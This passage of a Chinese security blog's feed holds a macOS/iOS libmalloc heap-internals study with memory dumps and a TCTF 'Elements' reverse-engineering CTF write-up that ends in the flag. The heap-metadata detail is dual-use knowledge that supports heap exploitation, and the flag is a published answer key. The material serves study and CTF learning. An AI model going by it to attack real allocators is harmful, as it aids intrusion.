__PRETTY_FUNCTION__);}</code></pre><p>free的时候先将该内存缓存到<code>mag_last_free</code>，若之前<code>mag_last_free</code>为NULL，那么该内存暂时不会被free，仅仅是缓存到<code>mag_last_free</code>。反之，则会将<code>mag_last_free</code>之前的内存free。在free的时候会尝试向前向后合并。合并完成后设置其前后chunk指针等metadata后将其放入对应的free list大小之中。这里需要有注意以下几点</p><ul><li>最近free的内存会被缓存，不会立即合并</li><li>在被free的块metadata是被保护的<ul><li>前后指针按16字节大小对齐</li><li>指针前4位为checksum</li></ul></li></ul><p>关于free块checksum计算如下：</p><pre><code class="c">static MALLOC_INLINE uintptr_tfree_list_checksum_ptr(rack_t *rack, void *ptr){    uintptr_t p = (uintptr_t)ptr;    return (p &gt;&gt; NYBBLE) | ((free_list_gen_checksum(p ^ rack-&gt;cookie) &amp; (uintptr_t)0xF) &lt;&lt; ANTI_NYBBLE); // compiles to rotate instruction}</code></pre><p>指针p与cookie异或然后计算checksum后左移到最高字节或上指针p右移4位得到checksumed后的指针。</p><h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><p>代码如下</p><pre><code class="c">#include &lt;stdio.h&gt;int main(int argc, char *argv[]) {    void *p1,*p2,*p3,*p4;    p1 = malloc(24);    p2 = malloc(24);    p3 = malloc(24);    p4 = malloc(24);    memset(p1,0xaa,24);    memset(p2,0xbb,24);    memset(p3,0xcc,24);    free(p1);    free(p3);    free(p2);    free(p4);}</code></pre><p>free(p1)，直接将p1缓存，所以内存值不变</p><pre><code class="c">(lldb) x/24gx p10x1002001f0: 0xaaaaaaaaaaaaaaaa 0xaaaaaaaaaaaaaaaa0x100200200: 0xaaaaaaaaaaaaaaaa 0x00007fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0xcccccccccccccccc 0xcccccccccccccccc0x100200240: 0xcccccccccccccccc 0x0000000000000000</code></pre><p>free(p3)，p3放入缓存，p1放入大小为32字节的freelist，p1previous指针8字节设为NULL，next指针指向设为下一个free block，紧接着后面为该block大小，2*quantum=32字节</p><pre><code>(lldb) x/24gx p10x1002001f0: 0x0000000000000000 0x10000000100201080x100200200: 0xaaaaaaaaaaaa0002 0x00027fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0xcccccccccccccccc 0xcccccccccccccccc0x100200240: 0xcccccccccccccccc 0x0000000000000000</code></pre><p>free(p2)，p2放入缓存，p3放入大小为32字节的freelist，p3previous指针8字节设为NULL，next指针指向设为下一个p1</p><pre><code>(lldb) x/24gx p10x1002001f0: 0x3000000010020023 0x10000000100201080x100200200: 0xaaaaaaaaaaaa0002 0x00027fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0x0000000000000000 0x200000001002001f0x100200240: 0xcccccccccccc0002 0x00020000000000000x100200250: 0x0000000000000000 0x00000000000000000x100200260: 0x0000000000000029 0x0000000000000000</code></pre><p>free(p4)，p2向前向后合并，合并p1，p3。指向p1，大小为6*quantum=96字节。previous指针8字节设为NULL，next指针指向设为下一个大小为3Q的block</p><pre><code>(lldb) x/24gx p10x1002001f0: 0x0000000000000000 0x50000000100200480x100200200: 0xaaaaaaaaaaaa0006 0x00027fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0x0000000000000000 0x10000000100201080x100200240: 0xcccccccccccc0002 0x00060000000000000x100200250: 0x0000000000000000 0x00000000000000000x100200260: 0x0000000000000029 0x0000000000000000</code></pre><p>上面可以看出previous和next指针前4位都包含checksum。与上面描述的一致。</p><h4 id="libmalloc中一些结构体"><a href="#libmalloc中一些结构体" class="headerlink" title="libmalloc中一些结构体"></a>libmalloc中一些结构体</h4><h5 id="szone-s-magazine-zone-h"><a href="#szone-s-magazine-zone-h" class="headerlink" title="szone_s // magazine_zone.h"></a>szone_s // magazine_zone.h</h5><pre><code class="c">typedef struct szone_s {      // vm_allocate()&#39;d, so page-aligned to begin with.    malloc_zone_t basic_zone; // first page will be given read-only protection    uint8_t pad[PAGE_MAX_SIZE - sizeof(malloc_zone_t)];    unsigned long cpu_id_key; // unused    // remainder of structure is R/W (contains no function pointers)    unsigned debug_flags;    void *log_address;    /* Allocation racks per allocator type. */    struct rack_s tiny_rack;    struct rack_s small_rack;    /* large objects: all the rest */    _malloc_lock_s large_szone_lock MALLOC_CACHE_ALIGN; // One customer at a time for large    unsigned num_large_objects_in_use;    unsigned num_large_entries;    large_entry_t *large_entries; // hashed by location; null entries don&#39;t count    size_t num_bytes_in_large_objects;#if CONFIG_LARGE_CACHE    int large_entry_cache_oldest;    int large_entry_cache_newest;    large_entry_t large_entry_cache[LARGE_ENTRY_CACHE_SIZE]; // &quot;death row&quot; for large malloc/free    boolean_t large_legacy_reset_mprotect;    size_t large_entry_cache_reserve_bytes;    size_t large_entry_cache_reserve_limit;    size_t large_entry_cache_bytes; // total size of death row, bytes#endif    /* flag and limits pertaining to altered malloc behavior for systems with     * large amounts of physical memory */    unsigned is_largemem;    unsigned large_threshold;    unsigned vm_copy_threshold;    /* security cookie */    uintptr_t cookie;    /* The purgeable zone constructed by create_purgeable_zone() would like to hand off tiny and small     * allocations to the default scalable zone. Record the latter as the &quot;helper&quot; zone here. */    struct szone_s *helper_zone;    boolean_t flotsam_enabled;} szone_t;</code></pre><h5 id="malloc-zone-t-malloc-h"><a href="#malloc-zone-t-malloc-h" class="headerlink" title="malloc_zone_t // malloc.h"></a>malloc_zone_t // malloc.h</h5><pre><code class="c">typedef struct _malloc_zone_t {    /* Only zone implementors should depend on the layout of this structure;    Regular callers should use the access functions below */    void    *reserved1;    /* RESERVED FOR CFAllocator DO NOT USE */    void    *reserved2;    /* RESERVED FOR CFAllocator DO NOT USE */    size_t     (* MALLOC_ZONE_FN_PTR(size))(struct _malloc_zone_t *zone, const void *ptr); /* returns the size of a block or 0 if not in this zone; must be fast, especially for negative answers */    void     *(* MALLOC_ZONE_FN_PTR(malloc))(struct _malloc_zone_t *zone, size_t size);    void     *(* MALLOC_ZONE_FN_PTR(calloc))(struct _malloc_zone_t *zone, size_t num_items, size_t size); /* same as malloc, but block returned is set to zero */    void     *(* MALLOC_ZONE_FN_PTR(valloc))(struct _malloc_zone_t *zone, size_t size); /* same as malloc, but block returned is set to zero and is guaranteed to be page aligned */    void     (* MALLOC_ZONE_FN_PTR(free))(struct _malloc_zone_t *zone, void *ptr);    void     *(* MALLOC_ZONE_FN_PTR(realloc))(struct _malloc_zone_t *zone, void *ptr, size_t size);    void     (* MALLOC_ZONE_FN_PTR(destroy))(struct _malloc_zone_t *zone); /* zone is destroyed and all memory reclaimed */g    const char    *zone_name;    /* Optional batch callbacks; these may be NULL */    unsigned    (* MALLOC_ZONE_FN_PTR(batch_malloc))(struct _malloc_zone_t *zone, size_t size, void **results, unsigned num_requested); /* given a size, returns pointers capable of holding that size; returns the number of pointers allocated (maybe 0 or less than num_requested) */    void    (* MALLOC_ZONE_FN_PTR(batch_free))(struct _malloc_zone_t *zone, void **to_be_freed, unsigned num_to_be_freed); /* frees all the pointers in to_be_freed; note that to_be_freed may be overwritten during the process */    struct malloc_introspection_t    * MALLOC_INTROSPECT_TBL_PTR(introspect);    unsigned    version;    /* aligned memory allocation. The callback may be NULL. Present in version &gt;= 5. */    void *(* MALLOC_ZONE_FN_PTR(memalign))(struct _malloc_zone_t *zone, size_t alignment, size_t size);    /* free a pointer known to be in zone and known to have the given size. The callback may be NULL. Present in version &gt;= 6.*/    void (* MALLOC_ZONE_FN_PTR(free_definite_size))(struct _malloc_zone_t *zone, void *ptr, size_t size);    /* Empty out caches in the face of memory pressure. The callback may be NULL. Present in version &gt;= 8. */    size_t     (* MALLOC_ZONE_FN_PTR(pressure_relief))(struct _malloc_zone_t *zone, size_t goal);    /*     * Checks whether an address might belong to the zone. May be NULL. Present in version &gt;= 10.     * False positives are allowed (e.g. the pointer was freed, or it&#39;s in zone space that has     * not yet been allocated. False negatives are not allowed.     */    boolean_t (* MALLOC_ZONE_FN_PTR(claimed_address))(struct _malloc_zone_t *zone, void *ptr);} malloc_zone_t;</code></pre><h5 id="rack-t-magazine-rack-h"><a href="#rack-t-magazine-rack-h" class="headerlink" title="rack_t // magazine_rack.h"></a>rack_t // magazine_rack.h</h5><pre><code class="c">typedef struct rack_s {    /* Regions for tiny objects */    _malloc_lock_s region_lock MALLOC_CACHE_ALIGN;    rack_type_t type;    size_t num_regions;    size_t num_regions_dealloc;    region_hash_generation_t *region_generation;    region_hash_generation_t rg[2];    region_t initial_regions[INITIAL_NUM_REGIONS];    int num_magazines;    unsigned num_magazines_mask;    int num_magazines_mask_shift;    uint32_t debug_flags;    // array of per-processor magazines    magazine_t *magazines;    uintptr_t cookie;    uintptr_t last_madvise;} rack_t;</code></pre><h5 id="magazine-t-magazine-zone-h"><a href="#magazine-t-magazine-zone-h" class="headerlink" title="magazine_t // magazine_zone.h"></a>magazine_t // magazine_zone.h</h5><pre><code class="c">typedef struct magazine_s { // vm_allocate()&#39;d, so the array of magazines is page-aligned to begin with.    // Take magazine_lock first,  Depot lock when needed for recirc, then szone-&gt;{tiny,small}_regions_lock when needed for alloc    _malloc_lock_s magazine_lock MALLOC_CACHE_ALIGN;    // Protection for the crtical section that does allocate_pages outside the magazine_lock    volatile boolean_t alloc_underway;    // One element deep &quot;death row&quot;, optimizes malloc/free/malloc for identical size.    void *mag_last_free;    msize_t mag_last_free_msize;    // msize for mag_last_free#if MALLOC_TARGET_64BIT    uint32_t _pad;#endif    region_t mag_last_free_rgn; // holds the region for mag_last_free    free_list_t mag_free_list[MAGAZINE_FREELIST_SLOTS];    uint32_t mag_bitmap[MAGAZINE_FREELIST_BITMAP_WORDS];    // the first and last free region in the last block are treated as big blocks in use that are not accounted for    size_t mag_bytes_free_at_end;    size_t mag_bytes_free_at_start;    region_t mag_last_region; // Valid iff mag_bytes_free_at_end || mag_bytes_free_at_start &gt; 0    // bean counting ...    size_t mag_num_bytes_in_objects;    size_t num_bytes_in_magazine;    unsigned mag_num_objects;    // recirculation list -- invariant: all regions owned by this magazine that meet the emptiness criteria    // are located nearer to the head of the list than any region that doesn&#39;t satisfy that criteria.    // Doubly linked list for efficient extraction.    unsigned recirculation_entries;    region_trailer_t *firstNode;    region_trailer_t *lastNode;#if MALLOC_TARGET_64BIT    uintptr_t pad[320 - 14 - MAGAZINE_FREELIST_SLOTS -            (MAGAZINE_FREELIST_BITMAP_WORDS + 1) / 2];#else    uintptr_t pad[320 - 16 - MAGAZINE_FREELIST_SLOTS -            MAGAZINE_FREELIST_BITMAP_WORDS];#endif} magazine_t;</code></pre><h5 id="tiny-region-t-magazine-zone-h"><a href="#tiny-region-t-magazine-zone-h" class="headerlink" title="tiny_region_t //magazine_zone.h"></a>tiny_region_t //magazine_zone.h</h5><pre><code class="c">/* * Layout of a tiny region */typedef uint32_t tiny_block_t[4]; // assert(TINY_QUANTUM == sizeof(tiny_block_t))typedef struct tiny_header_inuse_pair {    uint32_t header;    uint32_t inuse;} tiny_header_inuse_pair_t;typedef struct region_trailer {    struct region_trailer *prev;    struct region_trailer *next;    boolean_t recirc_suitable;    volatile int pinned_to_depot;    unsigned bytes_used;    mag_index_t mag_index;} region_trailer_t;#define NUM_TINY_BLOCKS 64520typedef struct tiny_region {    tiny_block_t blocks[NUM_TINY_BLOCKS];    region_trailer_t trailer;    // The interleaved bit arrays comprising the header and inuse bitfields.    // The unused bits of each component in the last pair will be initialized to sentinel values.    tiny_header_inuse_pair_t pairs[CEIL_NUM_TINY_BLOCKS_WORDS];    uint8_t pad[TINY_REGION_SIZE - (NUM_TINY_BLOCKS * sizeof(tiny_block_t)) - TINY_METADATA_SIZE];} * tiny_region_t;</code></pre><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><p><a href="http://phrack.org/issues/63/5.html" target="_blank" rel="external">http://phrack.org/issues/63/5.html</a></p></li><li><p><a href="https://www.synacktiv.com/ressources/Sthack_2018_Heapple_Pie.pdf" target="_blank" rel="external">https://www.synacktiv.com/ressources/Sthack_2018_Heapple_Pie.pdf</a></p></li><li><p><a href="https://papers.put.as/papers/macosx/2016/Summercon-2016.pdf" target="_blank" rel="external">https://papers.put.as/papers/macosx/2016/Summercon-2016.pdf</a></p></li><li><p><a href="https://www.cocoawithlove.com/2010/05/look-at-how-malloc-works-on-mac.html" target="_blank" rel="external">https://www.cocoawithlove.com/2010/05/look-at-how-malloc-works-on-mac.html</a></p></li><li><p>&lt;&lt;<a href="https://repo.zenk-security.com/Magazine%20E-book/The%20Mac%20Hacker&#39;s%20Handbook.pdf" target="_blank" rel="external">the Mac Hacker’s Handbook</a>&gt;&gt; 第8章Exploiting Heap Overflows</p></li><li><p><a href="https://opensource.apple.com/source/libmalloc/" target="_blank" rel="external">https://opensource.apple.com/source/libmalloc/</a> 源代码</p></li><li><p><a href="http://www.mindfiresolutions.com/mindfire/Mac_Memory_Manager.pdf" target="_blank" rel="external">http://www.mindfiresolutions.com/mindfire/Mac_Memory_Manager.pdf</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;源码解读macOS-iOS-Heap&quot;&gt;&lt;a href=&quot;#源码解读macOS-iOS-Heap&quot; class=&quot;headerlink&quot; title=&quot;源码解读macOS/iOS Heap&quot;&gt;&lt;/a&gt;源码解读macOS/iOS Heap&lt;/h3&gt;&lt;blockquo
      
    
    </summary>
    
      <category term="OS" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/OS/"/>
    
    
      <category term="heap" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>TCTF-Elements</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/27/TCTF-Elements/TCTF-Elements/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/27/TCTF-Elements/TCTF-Elements/</id>
    <published>2019-03-27T07:13:30.000Z</published>
    <updated>2019-03-28T07:06:17.336Z</updated>
    
    <content type="html"><![CDATA[<h4 id="TCTF-Elements"><a href="#TCTF-Elements" class="headerlink" title="TCTF-Elements"></a>TCTF-Elements</h4><blockquote><p>这道题其实是一个数学问题，当时没有做出来，解题过程中走了很多弯路，踩了很多坑，不过也补了很多知识。</p></blockquote><h4 id="Elements"><a href="#Elements" class="headerlink" title="Elements"></a>Elements</h4><p>下面是main函数伪代码</p><pre><code class="c">signed __int64 __fastcall main(__int64 a1, char **a2, char **a3){  char v3; // bl  const __int32_t **v4; // rax  char *v5; // rcx  size_t v6; // rcx  signed __int64 result; // rax  char *v8; // r12  signed __int64 v9; // r14  char v10; // bl  signed __int64 v11; // rax  const unsigned __int16 *v12; // rcx  signed __int64 v13; // rdx  __int64 v14; // rsi  unsigned __int16 v15; // bx  signed __int64 v16; // rsi  __m128i v17; // xmm0  char *v18; // rax  double v19; // xmm2_8  double v20; // xmm0_8  double v21; // xmm2_8  double v22; // xmm3_8  double v23; // [rsp+20h] [rbp-148h]  double v24; // [rsp+28h] [rbp-140h]  double v25; // [rsp+30h] [rbp-138h]  char s[8]; // [rsp+40h] [rbp-128h]  char v27; // [rsp+6Bh] [rbp-FDh]  fgets(s, 256, stdin);  v3 = s[0];  if ( s[0] )  {    v4 = __ctype_tolower_loc();    v5 = &amp;s[1];    do    {      *(v5 - 1) = (*v4)[v3];      v3 = *v5++;    }    while ( v3 );  }  v6 = strlen(s);  result = 0LL;  if ( v6 &gt;= 0x2C &amp;&amp; (*(_QWORD *)s &amp; 0xFFFFFFFFFFLL) == 530015415398LL &amp;&amp; v27 == 125 )  {    v27 = 0;    v8 = strtok(&amp;s[5], &quot;-&quot;);    v9 = 0LL;    if ( v8 )    {      while ( strlen(v8) == 12 )      {        v10 = *v8;        v11 = 0LL;        if ( *v8 )        {          v12 = *__ctype_b_loc();          v13 = 1LL;          v11 = 0LL;          do          {            v14 = v10;            v15 = v12[v10];            if ( (char)v14 &lt;= 102 &amp;&amp; v15 &amp; 0x400 )            {              v16 = v14 - 87;            }            else            {              if ( !(v15 &amp; 0x800) )                goto LABEL_31;              v16 = v14 - 48;            }            v11 = v16 | 16 * v11;            if ( v13 &gt; 11 )              break;            v10 = v8[v13++];          }          while ( v10 );        }        if ( !v9 &amp;&amp; v11 != 62791383142154LL )          break;        v17 = (__m128i)_mm_sub_pd(                         (__m128d)_mm_unpacklo_epi32((__m128i)(unsigned __int64)v11, (__m128i)xmmword_400BD0),                         (__m128d)xmmword_400BE0);        *(&amp;v23 + v9++) = COERCE_DOUBLE(_mm_shuffle_epi32(v17, 78)) + *(double *)v17.m128i_i64;        v18 = strtok(0LL, &quot;-&quot;);        v8 = v18;        if ( v9 &gt; 2 || !v18 )        {          if ( v24 &lt;= v23 || v25 &lt;= v24 || v23 + v24 &lt;= v25 )            break;          v19 = v24 * v24 + v23 * v23 - v25 * v25;          v20 = sqrt(4.0 * v23 * v23 * v24 * v24 - v19 * v19) * 0.25;          v21 = (v20 + v20) / (v23 + v24 + v25) + -1.940035480806554e13;          if ( v21 &lt; 0.00001 &amp;&amp; v21 &gt; -0.00001 )          {            v22 = v23 * v24 * v25 / (v20 * 4.0) + -4.777053952827391e13;            if ( v22 &lt; 0.00001 &amp;&amp; v22 &gt; -0.00001 )              puts(&quot;Congratz, input is your flag&quot;);          }          return 0LL;        }      }    }LABEL_31:    result = 0xFFFFFFFFLL;  }  return result;}</code></pre><p>这个题整个逻辑很清晰，前面一部分对输入的字符串做了一些格式和字符数量判断。</p><p>分析可得到需要输入以下格式<code>flag{xxxxxxxxxxxx-xxxxxxxxxxxx-xxxxxxxxxxxx}</code></p><p>这里通过<code>-</code>分割成三个部分，其中第一部分是已知的<code>391bc2164f0a</code>，后面就是程序验证逻辑</p><pre><code class="c">          if ( v24 &lt;= v23 || v25 &lt;= v24 || v23 + v24 &lt;= v25 )            break;          v19 = v24 * v24 + v23 * v23 - v25 * v25;          v20 = sqrt(4.0 * v23 * v23 * v24 * v24 - v19 * v19) * 0.25;          v21 = (v20 + v20) / (v23 + v24 + v25) + -1.940035480806554e13;          if ( v21 &lt; 0.00001 &amp;&amp; v21 &gt; -0.00001 )          {            v22 = v23 * v24 * v25 / (v20 * 4.0) + -4.777053952827391e13;            if ( v22 &lt; 0.00001 &amp;&amp; v22 &gt; -0.00001 )              puts(&quot;Congratz, input is your flag&quot;);          }</code></pre><p>当时一看其实就知道是一个三角形相关的运算，整理可得以下表达式</p><p>$c&gt;b,b&gt;a,a+b&gt;c$</p><p>$p=\frac{\sqrt{4a^2b^2-(a^2+b^2-c^2)^2)}}{2(a+b+c)}-1.940035480806554e13$</p><p>$q=\frac{abc}{(\sqrt{4a^2b^2-(a^2+b^2-c^2)^2})}-4.777053952827391e13$</p><p>$-0.00001&lt;p&lt;0.00001,-0.00001&lt;q&lt;0.00001 $</p><p>但并没有看出来是三角形内外圆的半径公式，所以想着直接上约束求解器z3</p><pre><code class="python">from z3 import *x = Real(&#39;x&#39;)y = Real(&#39;y&#39;)z = Real(&#39;z&#39;)m = Real(&#39;m&#39;)n = Real(&#39;n&#39;)p = Real(&#39;p&#39;)q = Real(&#39;q&#39;)solver = Solver()m = x*x+y*y-z*zn = (4.0*x*x*y*y-m*m)**0.5*0.25p = 2*n/(x+y+z) + (-1.940035480806554296875E13)q = x*y*z/(4.0*n) + (-4.777053952827391e13)solver.add(z &gt; y)solver.add(y &gt; x)solver.add(x + y &gt; z)solver.add(p &gt; -100,p&lt;100)solver.add(q &gt; -100,q&lt;100)solver.add(x == 6.2791383142154e13)if solver.check() == sat:    print(solver.model())else:    print(&#39;unsolve&#39;)</code></pre><p>结果求解了很久z3解不出来，后来才知道z3不能求解该类问题。z3文档中有提及只能解决非线性多项式约束，导致花了很长时间在思考是不是脚本的问题。然后用wolframalpha去求解也没有结果（目前还不清楚原因</p><p>下来思考了很久才知道是求解三角形的内外半径，通过内外圆的性质得到如下公式</p><p>$$Rr=\frac{abc}{2(a+b+c)}$$</p><p>$$tan\frac{C}{2} = \frac{2r}{a+b-c} = \frac{sinC}{1+cosC}$$</p><p>这里$sinC,cosC,R,r,c$都是已知的</p><p>所以联立能得到$$a=7.0802074077033E13,b=9.5523798483318E13 $$</p><p>得到对应的浮点数表示4064e4798769,56e0de138176</p><pre><code class="assembly">movq    xmm0, raxpunpckldq xmm0, xmmword ptr cs:qword_400BD0subpd   xmm0, cs:xmmword_400BE0pshufd  xmm1, xmm0, 4Ehaddpd   xmm1, xmm0movlpd  [rsp+r14*8+168h+var_148], xmm1</code></pre><p>在这里需要逆向求解出rax的值，即flag后面两部分。刚开始在这里卡了一下，感觉求解不出来。后面观察到qword_400BD0和xmmword_400BE0这两个数十分特殊</p><pre><code>qword_400BD0=0x4530000043300000xmmword_400BE0=0x45300000000000004330000000000000</code></pre><p>punpckldq指令会将qword_400BD0和rax分成两部分组合，这里恰好qword_400BD0为浮点数的阶数部分，rax为尾数部分</p><p>然后再分别与4530000000000000，4330000000000000相减。特殊在于这两个数阶数和上面对应相等，尾数部分为0，倒是相减结果又变回原始值。</p><p>所以其实这里的变换等于没有变换。</p><p>所以三个边长分别等于391bc2164f0a,4064e4798769,56e0de138176</p><p>最后的flag=flag{391bc2164f0a-4064e4798769-56e0de138176}</p><h4 id="补充：浮点数表示、运算、指令"><a href="#补充：浮点数表示、运算、指令" class="headerlink" title="补充：浮点数表示、运算、指令"></a>补充：浮点数表示、运算、指令</h4><p>浮点数有单精度和双精度之分，float占4个字节，double占8个字节</p><p>在表示小数的时候采用类比科学计数法的方法，把二进制小数转换为2为底的指数表示$V=(-1)^s<em>M</em>2^E$</p><p>e等于向左或向右移动到1为止的个数</p><p>比如：12.25   对应二进制：1100.01 这里需要向右移动三位$1.10001*2^3$</p><p>下面以float表示12.25这个数，分为三部分，符号位（1位）、指数（8位）、尾数（23位）</p><p>符号位0，指数3，尾数10001(第一位默认为1不需要表示)</p><p>由于指数也有负指数，所以其实还需要一位表示符号位， IEEE规定，小于01111111的指数位为负数</p><p>其实这里可以理解为首位表示符号位，这样的话采用如下计算出float指数部分表示<code>10000000+11-1=10000010</code></p><p>最后12.15单精度浮点数表示为：<code>0 10000010 10001000000000000000000</code> </p><p>十六进制：<code>0x41440000</code> 内存中小端表示：<code>00 00 44 41</code></p><table><thead><tr><th style="text-align:center">Float/Double</th><th style="text-align:center">符号位</th><th style="text-align:center">指数</th><th style="text-align:center">尾数</th><th style="text-align:left">示例</th><th style="text-align:left">16进制</th></tr></thead><tbody><tr><td style="text-align:center">Float</td><td style="text-align:center">1位</td><td style="text-align:center">8位</td><td style="text-align:center">23位</td><td style="text-align:left">0 10000010 10001000000000000000000</td><td style="text-align:left">41440000</td></tr><tr><td style="text-align:center">Double</td><td style="text-align:center">1位</td><td style="text-align:center">11位</td><td style="text-align:center">52位</td><td style="text-align:left">0 10000000010 1000100000000000000000000000 000000000000000000000000</td><td style="text-align:left">4028800000000000</td></tr></tbody></table><p>特殊的数表示：当全指数尾数全为0时，表示最小的数，这里定义为0；当指数全为1，尾数全为0时，表示最大的数，这里定义为无穷。</p><p>在线转换<a href="http://www.binaryconvert.com/" target="_blank" rel="external">http://www.binaryconvert.com/</a> </p><p>浮点数在进行加减运算的时候需要先对阶然后尾数部分运算</p><p>浮点数指令查询<a href="https://asm.inightmare.org/opcodelst/index.php" target="_blank" rel="external">https://asm.inightmare.org/opcodelst/index.php</a></p><p>这里解释下<code>pshufd  xmm1, xmm0, 4Eh</code>指令</p><p><code>pshufd</code>可以按照指定的方式重新排列数据</p><p>这里4E二进制<code>01 00 11 10</code></p><table><thead><tr><th>寄存器</th><th>值</th></tr></thead><tbody><tr><td>xmm0</td><td>42cc8d80 00000000 41e842c9 e1400000</td></tr><tr><td>4E</td><td>01               00                 11               10</td></tr><tr><td>xmm1</td><td>41e842c9 e1400000 42cc8d80 00000000</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;TCTF-Elements&quot;&gt;&lt;a href=&quot;#TCTF-Elements&quot; class=&quot;headerlink&quot; title=&quot;TCTF-Elements&quot;&gt;&lt;/a&gt;TCTF-Elements&lt;/h4&gt;&lt;blockquote&gt;
&lt;p&gt;这道题其实是一个数学问题，
      
    
    </summary>
    
      <category term="ctf" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/ctf/"/>
    
    
      <category term="tctf" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/tctf/"/>
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>idapython learning note</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/07/idapython-learning-note/idapython-learning-note/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/07/idapython-learning-note/idapython-learning-note/</id>
    <published>2019-03-07T11:42:24.000Z</published>
    <updated>2019-04-08T11:25:34.497Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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